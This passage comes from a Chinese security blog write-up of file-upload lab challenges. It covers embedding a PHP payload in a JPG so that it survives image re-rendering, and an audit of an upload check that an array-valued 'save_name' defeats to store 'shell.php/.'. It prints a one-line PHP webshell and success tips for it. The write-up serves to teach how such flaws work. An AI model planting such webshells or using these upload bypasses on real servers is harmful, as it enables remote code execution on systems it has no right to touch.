+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>然后运行脚本插入 payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php jpg_payload.php 122728342.jpg</span><br><span class="line">Success!</span><br></pre></td></tr></table></figure>
+<p>生成的新图片为：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036747206733.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036747206733.jpg" alt="img"></a></p>
+<p>然后上传到目标网站上面渲染一下再导出：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/1603674733221.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/1603674733221.jpg" alt="img"></a></p>
+<p>那么来查看一下最终这个 JPG 里面是否带有 payload 信息：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036748931486.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036748931486.png" alt="img"></a></p>
+<p>无疑写 phpinfo () 是很容易成功的，但是 phpinfo () 并无实质性危害，我们需要插入真正的 webshell 才可以：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php $_GET[0]($_POST[1]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>这里非常玄学，在国光经历了不知道多少次失败后，才成功将上面的 payload 完整插入</p>
+</blockquote>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/1603675937154.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/1603675937154.jpg" alt="img"></a></p>
+<p>这个图马被 imagecreatefromjpeg 渲染后如下：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036760334176.jpg"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036760334176.jpg" alt="img"></a></p>
+<p>查看一下 payload 是否存在：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036761717904.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036761717904.png" alt="img"></a></p>
+<p>完美，尝试直接文件包含来执行攻击语句试试看：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036764145479.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036764145479.png" alt="img"></a></p>
+<p><strong>JPG 坑点总结</strong></p>
+<ol>
+<li>需要被 imagecreatefromjpeg 渲染或再用工具</li>
+<li>图片找的稍微大一点 成功率更高</li>
+<li>Payload 语句越短成功率越高</li>
+<li>一张图片不行就换一张 不要死磕</li>
+<li>国光补充：貌似白色的图片成功率也比较高</li>
+<li><code>&lt;?php $_GET[0]($_POST[1]);?&gt;</code> 这种 payload 成功率很高</li>
+</ol>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>代码审计这一题如果可以动态调试的话，那么理解起来就会比较简单：</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="https://image.3001.net/images/20201026/16036775446476.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036775446476.png" alt="img"></a></p>
+<p>这个题目是直接 copy Upload-labs 里面的最后一关，这个貌似还是后面新增的题目，下面是核心代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>实际上最后一关和上传关系不大，这个题主要考查 PHP 代码审计，关于代码审计的题目实际上 XDebug 动态调试一下就可以很轻松的做出来，关于 XDebug 的配置文章可以参考国光我之前写的两篇文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sqlsec.com/2020/07/macphp.html">国光 - macOS 下优雅地配置 PHP 代码审计环境</a></li>
+<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.sqlsec.com/2020/09/xdebug.html">国光 - Xdebug + 宝塔 + PHPStudy+VScode PHP</a></li>
+</ul>
+<p>首先看第一个判断：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以必须保证我们上传的表单 MIME 类型一定要符合标准。</p>
+<p>接着对我们提交的 sava_name 的字符串进行处理，如果不是数组的话就以 <code>.</code> 为分隔，打散为数组：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">  <span class="variable">$file</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果是<strong>数组的话就无需打散</strong>，这里比较关键，后面再详细说，先记着。</p>
+<p>因为打散后会校验最后的后缀：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;black();&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果不是合法后缀的话直接就报错了，所以我们老老实实的传入合法的字符串类型的不行的，这里的传入一个数组。比如这样的数组：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = [<span class="number">0</span>=&gt;<span class="string">&#x27;shell.php/&#x27;</span>, <span class="number">2</span>=&gt;<span class="string">&#x27;png&#x27;</span>]</span><br></pre></td></tr></table></figure>
+<p>这样执行完最后的拼接文件名的代码后：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="string">&#x27;shell.php/&#x27;</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="number">2</span> - <span class="number">1</span>]; = <span class="string">&#x27;shell.php/&#x27;</span>.<span class="string">&#x27;&#x27;</span> = <span class="string">&#x27;shell.php/.&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>这样最后一步：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">PHPmove_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="string">&#x27;xx/xx/shell/php/.&#x27;</span>)  </span><br></pre></td></tr></table></figure>
+<p>结合前面的 move_uploaded_file 函数缺陷，会忽略掉文件末尾的 <code>/.</code>，所以最终就可以成功将 webshell 上传。</p>
+<p>那么最终构造的数据包如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.3001.net/images/20201026/16036832903333.png" alt="img"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="Chalnl">Chalnl</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://chalnl.com/posts/22329/sec3/">http://chalnl.com/posts/22329/sec3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://chalnl.com" target="_blank">Chalnl's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/">密码爆破</a><a class="post-meta__tags" href="/tags/%E9%A2%98%E7%9B%AE%E8%AF%A6%E8%A7%A3/">题目详解</a></div><div class="post_share"><div class="addthis_inline_share_toolbox"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=null" async="async"></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/14857/sec4/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tva1.sinaimg.cn/large/008s52kYly1h54g9bcbnoj32bc334gu9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">认证技术</div></div></a></div><div class="next-post pull-right"><a href="/posts/17553/sec2/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tva1.sinaimg.cn/large/008s52kYly1h54g9auiq2j325s1cmn1e.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">文件上传漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/23577/sec1/" title="渗透测试"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tva1.sinaimg.cn/large/008s52kYly1h553gi380yj32u336rh29.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-08</div><div class="title">渗透测试</div></div></a></div><div><a href="/posts/17553/sec2/" title="文件上传漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tva1.sinaimg.cn/large/008s52kYly1h54g9auiq2j325s1cmn1e.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-09</div><div class="title">文件上传漏洞</div></div></a></div><div><a href="/posts/14857/sec4/" title="认证技术"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://tva1.sinaimg.cn/large/008s52kYly1h54g9bcbnoj32bc334gu9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-13</div><div class="title">认证技术</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BurpSuite-lntruder%E7%88%86%E7%A0%B4%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">BurpSuite lntruder爆破模块详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2"><span class="toc-number">1.1.</span> <span class="toc-text">环境部署</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web%E7%88%86%E7%A0%B4%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-number">1.2.</span> <span class="toc-text">Web爆破靶场实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%AE%80%E5%8D%95%E7%9A%84%E5%9B%9B%E4%BD%8D%E6%95%B0%E5%AD%97%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.简单的四位数字密码爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%AE%80%E5%8D%95%E7%9A%84%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.简单的弱口令密码爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%B8%A6%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%EF%BC%9F"><span class="toc-number">1.2.3.</span> <span class="toc-text">3.带验证码的密码爆破？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Basic-%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.4.</span> <span class="toc-text">4.Basic 爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.5.</span> <span class="toc-text">5.前端加密爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%92%9E%E5%BA%93"><span class="toc-number">1.2.6.</span> <span class="toc-text">6.泄露数据库撞库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E6%B3%84%E9%9C%B2%E6%95%B0%E6%8D%AE%E5%BA%93%E6%92%9E%E5%BA%93-2"><span class="toc-number">1.2.7.</span> <span class="toc-text">7.泄露数据库撞库-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%BF%94%E5%9B%9E%E5%8C%85%E6%8F%90%E5%8F%96%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.8.</span> <span class="toc-text">8.返回包提取爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E7%AE%80%E5%8D%95%E7%9A%84-token-%E9%AA%8C%E8%AF%81"><span class="toc-number">1.2.9.</span> <span class="toc-text">9.简单的 token 验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E6%B2%A1%E6%9C%89%E7%AE%80%E5%8D%95%E7%9A%84%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.2.10.</span> <span class="toc-text">10.没有简单的弱口令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JS"><span class="toc-number">2.</span> <span class="toc-text">JS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9A%E6%8A%93%E5%8C%85"><span class="toc-number">2.1.</span> <span class="toc-text">解法一：抓包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%9A%E7%A6%81%E7%94%A8-JS"><span class="toc-number">2.2.</span> <span class="toc-text">解法二：禁用 JS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%89%EF%BC%9A%E8%B0%83%E8%AF%95-JS"><span class="toc-number">2.3.</span> <span class="toc-text">解法三：调试 JS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MIME"><span class="toc-number">3.</span> <span class="toc-text">MIME</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4"><span class="toc-number">4.</span> <span class="toc-text">文件头</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%BA%E9%99%B7%E7%9A%84%E4%BB%A3%E7%A0%81-1"><span class="toc-number">5.</span> <span class="toc-text">缺陷的代码 - 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%BA%E9%99%B7%E7%9A%84%E4%BB%A3%E7%A0%81-2"><span class="toc-number">6.</span> <span class="toc-text">缺陷的代码 - 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95"><span class="toc-number">7.</span> <span class="toc-text">黑名单</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E8%A7%84%E5%88%99"><span class="toc-number">8.</span> <span class="toc-text">解析规则</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%A4%E8%80%81%E7%9A%84%E6%BC%8F%E6%B4%9E-1"><span class="toc-number">9.</span> <span class="toc-text">古老的漏洞 - 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%A4%E8%80%81%E7%9A%84%E6%BC%8F%E6%B4%9E-2"><span class="toc-number">10.</span> <span class="toc-text">古老的漏洞 - 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">11.</span> <span class="toc-text">条件竞争</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#move-uploaded-file-%E7%BC%BA%E9%99%B7"><span class="toc-number">12.</span> <span class="toc-text">move_uploaded_file 缺陷</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-number">13.</span> <span class="toc-text">二次渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#GIF"><span class="toc-number">13.1.</span> <span class="toc-text">GIF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PNG"><span class="toc-number">13.2.</span> <span class="toc-text">PNG</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5-PLTE-%E6%95%B0%E6%8D%AE%E5%9D%97"><span class="toc-number">13.2.1.</span> <span class="toc-text">写入 PLTE 数据块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E5%85%A5-IDAT-%E6%95%B0%E6%8D%AE%E5%9D%97"><span class="toc-number">13.2.2.</span> <span class="toc-text">写入 IDAT 数据块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JPG"><span class="toc-number">13.3.</span> <span class="toc-text">JPG</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">14.</span> <span class="toc-text">代码审计</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://tva1.sinaimg.cn/large/008s52kYly1h553icnjodj30n20uwgnb.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 By Chalnl</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="icp链接"><img class="icp-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="icp图片"><span>备案号：xxxxxx</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script 